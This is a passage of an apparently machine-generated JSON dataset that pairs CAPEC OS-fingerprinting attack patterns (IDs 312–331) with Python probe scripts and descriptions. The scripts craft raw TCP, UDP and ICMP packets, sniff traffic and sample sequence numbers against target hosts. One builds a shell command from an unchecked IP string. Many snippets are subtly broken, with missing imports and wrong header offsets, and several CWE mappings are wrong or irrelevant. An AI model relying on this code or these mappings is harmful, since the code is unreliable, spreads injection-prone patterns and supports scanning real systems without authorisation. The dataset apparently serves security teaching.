        "code_snippet": "import socket\n\n# Function to send a crafted packet to a target and analyze the response\ndef os_fingerprinting(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft a TCP packet with unusual flags\n    packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n    packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    packet += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header\n    packet += b'\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP flags and window size\n    \n    # Send the packet to the target\n    sock.sendto(packet, (target_ip, target_port))\n    \n    # Receive the response\n    response = sock.recv(1024)\n    \n    # Analyze the response to determine the OS\n    if response:\n        print(f'Received response from {target_ip}: {response}')\n        # Here, you would analyze the response to fingerprint the OS\n    else:\n        print(f'No response from {target_ip}')\n\n# Example usage\nos_fingerprinting('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic form of active OS fingerprinting by sending a crafted TCP packet with unusual flags to a target IP address and port. The response from the target is then analyzed to infer the operating system. The code uses raw sockets to create and send the packet, which can reveal differences in how various operating systems handle and respond to such packets. This approach leverages the concept of 'Observable Behavioral Discrepancy With Equivalent Products' (CWE-207) as different OS implementations will respond uniquely to the crafted packet. Additionally, the code does not encrypt the packet or the response, potentially exposing sensitive information (CWE-319)."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to passively capture packets\ndef capture_packets(interface):\n    # Create a raw socket to capture packets\n    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    raw_socket.bind((interface, 0))\n    \n    while True:\n        packet = raw_socket.recvfrom(65565)[0]\n        eth_header = packet[0:14]\n        eth = struct.unpack('!6s6sH', eth_header)\n        eth_protocol = socket.ntohs(eth[2])\n        \n        # Check if the packet is an IP packet\n        if eth_protocol == 8:\n            ip_header = packet[14:34]\n            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)\n            ttl = iph[5]\n            src_addr = socket.inet_ntoa(iph[8])\n            \n            # Log the IP and TTL values\n            print(f'Source IP: {src_addr}, TTL: {ttl}')\n            \n            # Simulate storing sensitive trace data in an unprotected location\n            with open('trace_data.log', 'a') as f:\n                f.write(f'Source IP: {src_addr}, TTL: {ttl}\\n')\n\n# Example usage\ncapture_packets('eth0')",
        "description": "This Python code snippet demonstrates passive OS fingerprinting by capturing network packets on a specified interface. It uses a raw socket to capture all packets and extracts the IP header to log the source IP address and TTL (Time To Live) value. The TTL value can be used to infer the operating system of the source device. The code also simulates a vulnerability by storing the captured trace data in an unprotected log file, which could be accessed by unauthorized actors. This embodies the CAPEC concept of passive OS fingerprinting and highlights related CWEs such as exposure of sensitive information (CWE-200, CWE-497), improper management of sensitive trace data (CWE-1323), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\n\n# CWE-532: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef get_os_fingerprint(ip):\n    try:\n        # Simulate an active OS fingerprinting probe\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, 80))\n        sock.send(b'HEAD / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n        response = sock.recv(1024)\n        sock.close()\n        logging.debug(f'Response from {ip}: {response}')\n        return response\n    except Exception as e:\n        logging.error(f'Error connecting to {ip}: {e}')\n        return None\n\n# Example usage\nip_address = '192.168.1.1'\nresponse = get_os_fingerprint(ip_address)\nif response:\n    print(f'OS Fingerprint for {ip_address}: {response}')\nelse:\n    print(f'Failed to get OS Fingerprint for {ip_address}')",
        "description": "This Python code snippet demonstrates a basic implementation of an active OS fingerprinting probe, which aligns with the deprecated CAPEC-312. The code attempts to connect to a given IP address on port 80 and sends an HTTP HEAD request to gather information about the target's operating system. The response is logged to a debug file, which can expose sensitive information (CWE-532). The code also highlights potential security issues such as authentication bypass (CWE-287), reliance on DNS lookups (CWE-350), and improper management of sensitive data (CWE-1323). The function `get_os_fingerprint` returns the response from the target IP, simulating the fingerprinting process."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\n\n# Vulnerable function to demonstrate TCP/IP fingerprinting and authentication bypass\n\ndef vulnerable_function(ip, port):\n    try:\n        # Create a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((ip, port))\n\n        # Send a probe to identify the OS (TCP/IP Fingerprinting)\n        s.send(b'\\x00\\x00\\x00\\x00')\n        response = s.recv(1024)\n\n        # Log the response (potential information exposure)\n        with open('debug.log', 'a') as log_file:\n            log_file.write(f'Response from {ip}:{port} - {response}\\n')\n\n        # Simulate an authentication process\n        auth_token = 'auth_token_example'\n        s.send(auth_token.encode())\n        auth_response = s.recv(1024)\n\n        # Check if authentication is successful (vulnerable to replay attack)\n        if auth_response == b'OK':\n            print('Authentication successful')\n        else:\n            print('Authentication failed')\n\n    except Exception as e:\n        print(f'An error occurred: {e}')\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_function('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a vulnerable function that embodies the main idea of CAPEC-312: Active OS Fingerprinting, with additional context from related CWEs. The function attempts to connect to a given IP and port, sends a probe to identify the OS (TCP/IP Fingerprinting), and logs the response to a debug file (potential information exposure). It then simulates an authentication process that is vulnerable to replay attacks. The code highlights several security weaknesses, including CWE-294 (Authentication Bypass by Capture-replay) and CWE-532 (Information Exposure Through Debug Log Files)."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\n\n# Vulnerable function to determine OS using ICMP fingerprinting\n# This is a simplified and vulnerable example\n\ndef get_os(ip):\n    try:\n        # Send an ICMP echo request (ping)\n        response = os.system(f'ping -c 1 {ip}')\n        if response == 0:\n            return 'Host is up'\n        else:\n            return 'Host is down'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nip_address = '192.168.1.1'\nos_info = get_os(ip_address)\nprint(f'OS Information: {os_info}')\n\n# CWE-287: Authentication Bypass Issue\n# This code does not perform any authentication checks\n# CWE-532: Information Exposure Through Debug Log Files\n# Logging sensitive information without proper handling\nwith open('debug.log', 'a') as log_file:\n    log_file.write(f'OS Information for {ip_address}: {os_info}\\n')\n\n# CWE-1316: Overlapping protected and unprotected regions\n# This is a conceptual representation, not directly applicable in this code\n# CWE-319: Sensitive Information Accessible by Physical Probing\n# Not directly applicable in this code\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# This code does not rely on DNS lookups, but it is a related concept\n",
        "description": "This Python code snippet demonstrates a vulnerable function that attempts to determine the operating system of a remote host using ICMP fingerprinting (ping). The function `get_os` sends an ICMP echo request to the specified IP address and returns whether the host is up or down. This approach is related to CAPEC-312: Active OS Fingerprinting. The code also includes vulnerabilities related to the deprecated CWEs: it does not perform any authentication checks (CWE-287), logs sensitive information to a debug file without proper handling (CWE-532), and conceptually represents issues like overlapping protected and unprotected regions (CWE-1316) and sensitive information exposure (CWE-319). Although the code does not rely on DNS lookups (CWE-350), it is mentioned for context."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport time\n\ndef analyze_ip_id_sequence(target_ip):\n    ip_ids = []\n    for _ in range(5):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (target_ip, 0))\n        response = sock.recv(1024)\n        ip_id = int.from_bytes(response[4:6], byteorder='big')\n        ip_ids.append(ip_id)\n        time.sleep(1)\n    return ip_ids\n\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    ip_id_sequence = analyze_ip_id_sequence(target_ip)\n    print(f'IP ID Sequence: {ip_id_sequence}')",
        "description": "This Python code snippet demonstrates a basic IP ID sequencing probe, which is used to analyze the IP 'ID' field sequence number generation algorithm of a remote host. The code sends ICMP echo requests to the target IP address and captures the IP ID values from the responses. By examining the sequence of these IP ID values, an attacker can infer the operating system of the target host. This technique leverages the fact that different operating systems generate IP ID numbers differently. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP ID sequence, which can be considered sensitive information. Additionally, it indirectly relates to CWE-291 (Reliance on IP Address for Authentication) as it involves network communication based on IP addresses."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with a specific IP ID\ndef send_udp_probe(target_ip, target_port, ip_id):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    packet = b'\\x45\\x00\\x00\\x1c' + ip_id.to_bytes(2, 'big') + b'\\x00\\x00\\x40\\x11\\x00\\x00' + socket.inet_aton('192.168.1.1') + socket.inet_aton(target_ip) + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00' + b'\\x00\\x00'\n    sock.sendto(packet, (target_ip, target_port))\n\n# Function to receive ICMP error message\ndef receive_icmp_response():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    response, _ = sock.recvfrom(1024)\n    return response\n\n# Main function to perform the IP 'ID' Echoed Byte-Order Probe\ndef ip_id_echo_probe(target_ip, target_port):\n    ip_id = 12345  # Arbitrary IP ID value\n    send_udp_probe(target_ip, target_port, ip_id)\n    response = receive_icmp_response()\n    echoed_ip_id = response[24:26]  # Extract echoed IP ID from ICMP response\n    if echoed_ip_id == ip_id.to_bytes(2, 'big'):\n        print('IP ID echoed back correctly')\n    else:\n        print('IP ID not echoed back correctly')\n\n# Example usage\nip_id_echo_probe('192.168.1.100', 12345)",
        "description": "This Python code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP packet with a specific IP ID to a closed port on a target host and then listens for an ICMP error message in response. The IP ID from the response is checked to see if it matches the sent IP ID, indicating whether the target host echoes back the IP ID value. This can reveal information about the target's operating system or router firmware. The code also touches on related CWEs by showing how sensitive information (IP ID) can be exposed and potentially mismanaged."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with the DF bit set\ndef send_udp_packet_with_df(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header with DF bit set\n        ip_header = b'\\x45\\x00\\x00\\x1c\\x00\\x00\\x40\\x00\\x40\\x11\\x00\\x00'  # Version, IHL, Type of Service, Total Length, ID, Flags (DF set), Fragment Offset, TTL, Protocol, Header Checksum\n        ip_header += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        ip_header += socket.inet_aton(target_ip)  # Destination IP\n\n        # Construct UDP header\n        udp_header = b'\\x00\\x00' + target_port.to_bytes(2, 'big') + b'\\x00\\x08\\x00\\x00'  # Source Port, Destination Port, Length, Checksum\n\n        # Send the packet\n        sock.sendto(ip_header + udp_header, (target_ip, target_port))\n        print(f\"Packet sent to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nsend_udp_packet_with_df('192.168.1.2', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet with the 'Don't Fragment' (DF) bit set to a specified target IP and port. The code creates a raw socket and constructs an IP header with the DF bit set, followed by a UDP header. The packet is then sent to the target. This code embodies the main idea of the CAPEC 'IP (DF) 'Don't Fragment Bit' Echoing Probe' by attempting to observe whether the target system echoes back the DF bit in the response packet. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and incorrectly specified destinations (CWE-941), which can be exploited through such probes."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport struct\n\n# Function to extract TCP timestamp from a TCP packet\ndef extract_tcp_timestamp(packet):\n    tcp_header = packet[20:40]\n    tcp_options = packet[40:60]\n    timestamp_option = tcp_options[4:14]\n    timestamp = struct.unpack('!II', timestamp_option[2:10])\n    return timestamp\n\n# Function to send a TCP SYN packet and receive the response\ndef send_syn_and_receive_timestamp(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Crafting a simple TCP SYN packet\n    ip_header = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6' + socket.inet_aton('192.168.1.100') + socket.inet_aton(target_ip)\n    tcp_header = b'\\x00\\x50' + struct.pack('!H', target_port) + b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x72\\x10\\x00\\x00\\x00\\x00\\x00\\x00' + b'\\x01\\x01\\x08\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    packet = ip_header + tcp_header\n\n    sock.sendto(packet, (target_ip, target_port))\n    response = sock.recv(1024)\n\n    timestamp = extract_tcp_timestamp(response)\n    return timestamp\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    timestamp = send_syn_and_receive_timestamp(target_ip, target_port)\n    print(f'TCP Timestamp: {timestamp}')",
        "description": "This Python code snippet demonstrates how an attacker might probe a target server to extract TCP timestamps, which can be used for OS fingerprinting. The code sends a TCP SYN packet to a specified target IP and port, then captures the response to extract the TCP timestamp from the TCP options field. This timestamp can help the attacker infer the operating system of the target based on how different OSes handle TCP timestamps. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and observable timing discrepancies (CWE-208)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport time\n\n# Vulnerable PRNG seed\nseed = int(time.time())\n\n# Function to generate predictable TCP sequence number\ndef generate_sequence_number(ack_number):\n    return (ack_number + seed) % 2**32\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind to a port (potential CWE-605)\ntry:\n    s.bind(('0.0.0.0', 12345))\nexcept socket.error as e:\n    print(f'Bind failed: {e}')\n    exit()\n\n# Listen for incoming connections\ns.listen(1)\nprint('Listening on port 12345...')\n\nwhile True:\n    conn, addr = s.accept()\n    print(f'Connection from {addr}')\n    data = conn.recv(1024)\n    if not data:\n        break\n    ack_number = int.from_bytes(data[:4], 'big')\n    seq_number = generate_sequence_number(ack_number)\n    print(f'Generated sequence number: {seq_number}')\n    conn.send(seq_number.to_bytes(4, 'big'))\n    conn.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of TCP sequence number generation based on the CAPEC description. The code uses a predictable seed (current time) for the PRNG, which is a common weakness (CWE-337). The sequence number is generated by adding the seed to the acknowledgment number, making it predictable and thus exploitable for OS fingerprinting. The socket binding to a specific port (12345) also hints at potential issues with multiple binds to the same port (CWE-605). The code listens for incoming connections, receives an acknowledgment number, generates a sequence number using the vulnerable method, and sends it back to the client. This illustrates how an attacker could probe the system to determine the OS based on predictable sequence numbers."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport struct\nimport random\n\n# Function to send TCP SYN packet and receive SYN/ACK response\ndef send_syn_packet(target_ip, target_port):\n    try:\n        # Create raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct TCP SYN packet\n        src_port = random.randint(1024, 65535)\n        seq_num = random.randint(0, 4294967295)\n        syn_packet = struct.pack('!HHLLBBHHH', src_port, target_port, seq_num, 0, 5 << 4, 2, 8192, 0, 0)\n\n        # Send SYN packet\n        sock.sendto(syn_packet, (target_ip, target_port))\n\n        # Receive SYN/ACK response\n        response = sock.recv(1024)\n        return response\n    except Exception as e:\n        print(f'Error: {e}')\n        return None\n\n# Function to analyze ISN from SYN/ACK response\ndef analyze_isn(response):\n    if response:\n        # Extract ISN from SYN/ACK response\n        isn = struct.unpack('!L', response[24:28])[0]\n        return isn\n    return None\n\n# Main function to fingerprint OS based on ISN\ndef fingerprint_os(target_ip, target_port):\n    isn_list = []\n    for _ in range(5):\n        response = send_syn_packet(target_ip, target_port)\n        isn = analyze_isn(response)\n        if isn is not None:\n            isn_list.append(isn)\n\n    if isn_list:\n        gcd = isn_list[0]\n        for isn in isn_list[1:]:\n            gcd = math.gcd(gcd, isn)\n        print(f'GCD of ISNs: {gcd}')\n        # Compare GCD with known OS behaviors (not implemented)\n    else:\n        print('No valid ISNs received')\n\n# Example usage\nfingerprint_os('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of the TCP (ISN) Greatest Common Divisor Probe attack. It sends multiple TCP SYN packets to a target IP and port, receives SYN/ACK responses, and extracts the Initial Sequence Numbers (ISNs) from these responses. The ISNs are then analyzed to determine the greatest common divisor (GCD), which can be used to fingerprint the operating system of the target machine. The code highlights vulnerabilities related to the exposure of sensitive system information (CWE-200, CWE-497) and the potential for cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport random\n\nclass TCPISNProbe:\n    def __init__(self):\n        self.isn = random.randint(0, 2**32 - 1)\n        self.last_time = time.time()\n\n    def get_isn(self):\n        current_time = time.time()\n        time_diff = current_time - self.last_time\n        self.isn += int(time_diff * 1000)  # Simulate time-based ISN increment\n        self.last_time = current_time\n        return self.isn\n\n# Simulate capturing ISNs over time\nprobe = TCPISNProbe()\nisn_samples = [probe.get_isn() for _ in range(10)]\n\n# Analyze ISN increments to infer OS\nincrements = [isn_samples[i+1] - isn_samples[i] for i in range(len(isn_samples)-1)]\navg_increment = sum(increments) / len(increments)\n\n# Output the average increment (this would be compared against a database in a real attack)\nprint(f\"Average ISN increment: {avg_increment}\")",
        "description": "This Python code snippet simulates a TCP Initial Sequence Number (ISN) probe, which is used to measure the average rate of ISN increments over time. The `TCPISNProbe` class generates ISNs based on a time-based algorithm. The `get_isn` method calculates the ISN by incrementing it according to the elapsed time since the last call. The code captures a series of ISNs, calculates the increments between consecutive ISNs, and computes the average increment. This average increment can be used to infer the operating system by comparing it against a known database of OS-specific ISN increment rates. This embodies the CAPEC's main idea of using timing analysis to determine OS information. The code also touches on related CWEs, such as exposure of sensitive information (CWE-200) and covert timing channels (CWE-385), by demonstrating how timing information can be used to infer protected information."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import time\nimport random\n\n# Vulnerable PRNG using predictable seed\nclass PredictablePRNG:\n    def __init__(self):\n        # Using current time as seed, which is predictable\n        self.seed = int(time.time())\n        random.seed(self.seed)\n\n    def get_sequence_number(self):\n        # Generate a pseudo-random sequence number\n        return random.randint(0, 2**32 - 1)\n\n# Simulate TCP ISN generation\nprng = PredictablePRNG()\nsequence_number = prng.get_sequence_number()\nprint(f\"Generated TCP ISN: {sequence_number}\")\n\n# Exposing sensitive information\nprint(f\"Seed used for PRNG: {prng.seed}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a Pseudo-Random Number Generator (PRNG) for generating TCP Initial Sequence Numbers (ISNs). The PRNG is seeded with the current time, which is predictable (CWE-337). An attacker can observe the system time and predict the sequence numbers generated by this PRNG (CWE-341). Additionally, the code exposes the seed value used for the PRNG, which is sensitive information (CWE-200). This example embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how predictable sequence numbers can be generated and how sensitive information can be exposed."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with ECN flags set\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # Simplified IP header\nsrc_ip = socket.inet_aton('192.168.1.1')\ndst_ip = socket.inet_aton('192.168.1.2')\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x71\\x10\\x00\\x00\\x00\\x00'  # Simplified TCP header with ECN flags\npacket = ip_header + src_ip + dst_ip + tcp_header\n\n# Send the packet\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the response\nresponse = sock.recv(1024)\n\n# Check for ECN support in the response\nif response[33] & 0x03:  # Check ECN flags in the TCP header\n    print('ECN supported')\nelse:\n    print('ECN not supported')",
        "description": "This Python code snippet demonstrates a TCP Congestion Control Flag (ECN) probe, which is used to check if a remote host supports Explicit Congestion Notification (ECN) messaging. The code creates a raw socket and constructs a TCP packet with ECN flags set. It then sends this packet to a target IP address and waits for a response. By examining the ECN flags in the response, the code determines if the remote host supports ECN. This probe can be used for OS fingerprinting, as different operating systems may respond differently to ECN flags. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound error messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\n# Function to establish a TCP connection and check the initial window size\ndef check_initial_window_size(target_ip, target_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the target IP and port\n        s.connect((target_ip, target_port))\n        \n        # Get the initial window size\n        initial_window_size = s.getsockopt(socket.SOL_TCP, socket.TCP_WINDOW_CLAMP)\n        \n        print(f'Initial TCP Window Size: {initial_window_size}')\n        \n        # Close the socket\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ncheck_initial_window_size('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to establish a TCP connection to a target IP and port, and then retrieve the initial TCP window size. The function `check_initial_window_size` creates a socket, connects to the specified target, and uses the `getsockopt` method to obtain the initial window size. This information can be used for OS fingerprinting, as different operating systems use different initial window sizes. The code embodies the main idea of the CAPEC by probing the initial TCP window size, and it also touches on CWE-200 (Exposure of Sensitive Information) by potentially revealing OS-specific information. The code is kept concise and focuses on the core concept of the CAPEC."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a specific port\ns.bind(('0.0.0.0', 80))\n\n# Enable socket options to capture TCP options\ns.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nwhile True:\n    packet, addr = s.recvfrom(65535)\n    ip_header = packet[0:20]\n    tcp_header = packet[20:40]\n    tcp_options = packet[40:60]\n\n    # Print the TCP options for analysis\n    print(f'TCP Options from {addr}: {tcp_options}')\n\n    # Simulate exposure of sensitive information\n    if b'sensitive_data' in tcp_options:\n        print('Sensitive data exposed!')\n\n    # Simulate reliance on data/memory layout\n    try:\n        option_kind = tcp_options[0]\n        option_length = tcp_options[1]\n        print(f'Option Kind: {option_kind}, Option Length: {option_length}')\n    except IndexError:\n        print('Invalid TCP options layout detected!')",
        "description": "This Python code snippet creates a raw socket to capture and analyze TCP options from incoming packets. It binds to port 80 and enables socket options to include the IP header. The code continuously listens for incoming packets, extracts the TCP options, and prints them for analysis. It also simulates the exposure of sensitive information by checking for specific data within the TCP options and demonstrates reliance on data/memory layout by attempting to parse the TCP options. This code embodies the main idea of the 'TCP Options Probe' CAPEC by analyzing TCP header options and highlights related CWEs such as exposure of sensitive information and reliance on data/memory layout."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with RST flag and a text payload\nsrc_ip = '192.168.1.1'\ndst_ip = '192.168.1.2'\nsrc_port = 12345\ndst_port = 80\nseq = 0\nack_seq = 0\noffset_res = (5 << 4) | 0\nflags = 0x04  # RST flag\nwindow = socket.htons(5840)\nchecksum = 0\nurg_ptr = 0\n\n# TCP header fields\ntcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, checksum, urg_ptr)\n\n# Text payload\npayload = b'Connection reset by peer'\n\n# Calculate checksum (for simplicity, not implemented here)\n# checksum = calculate_checksum(tcp_header + payload)\n\n# Repack the TCP header with the correct checksum\n# tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, checksum, urg_ptr)\n\n# Send the packet\npacket = tcp_header + payload\nsock.sendto(packet, (dst_ip, 0))\n",
        "description": "This Python code snippet demonstrates the creation and sending of a TCP packet with the RST (reset) flag set, including a human-readable text payload. This is an example of the 'TCP RST Flag Checksum Probe' described in the CAPEC. The code creates a raw socket, constructs a TCP packet with the RST flag, and includes a text payload. The checksum calculation is mentioned but not implemented for simplicity. This code embodies the idea of using a TCP RST packet with a text payload to probe for OS fingerprinting, as some operating systems may include human-readable text in such packets. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200), missing integrity checks (CWE-353), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a specified host and port\ndef send_udp_packet(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'Test Message'\n    sock.sendto(message, (host, port))\n    sock.close()\n\n# Function to listen for ICMP error messages\ndef listen_for_icmp():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    sock.bind(('0.0.0.0', 0))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received ICMP error message from {addr}: {data}')\n\n# Example usage\nif __name__ == '__main__':\n    target_host = '192.0.2.1'  # Example target IP\n    target_port = 12345  # Example target port\n    send_udp_packet(target_host, target_port)\n    listen_for_icmp()",
        "description": "This Python code snippet demonstrates a simplified version of the 'ICMP Error Message Quoting Probe' attack. The `send_udp_packet` function sends a UDP packet to a specified host and port, which is likely to generate an ICMP error message if the port is unreachable. The `listen_for_icmp` function listens for incoming ICMP error messages, which may contain quoted data from the original UDP packet. This can expose sensitive information, aligning with CWE-200, CWE-211, and CWE-209. The code highlights how an adversary might probe a target to gather information from ICMP error messages."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\n\n# Function to send an ICMP Echo Request\ndef send_icmp_echo_request(target_ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # ICMP Echo Request packet\n        packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Type 8 (Echo), Code 0, Checksum 0\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive ICMP Error message\n        data, addr = sock.recvfrom(1024)\n        print(f'Received data from {addr}: {data}')\n\n        # Analyze the quoted data from the ICMP Error message\n        quoted_data = data[28:36]  # Extracting quoted part of the original request\n        print(f'Quoted data: {quoted_data}')\n\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsend_icmp_echo_request('192.168.1.1')",
        "description": "This Python code snippet demonstrates how an adversary might generate an ICMP Echo Request to a target IP address and then analyze the ICMP Error message returned. The code creates a raw socket to send an ICMP Echo Request packet and waits for an ICMP Error message in response. Upon receiving the error message, it extracts and prints the quoted data from the original request. This process can expose sensitive information contained in the quoted data, aligning with the CAPEC description and related CWEs, such as exposure of sensitive information (CWE-200), externally-generated error messages containing sensitive information (CWE-211), and missing support for integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
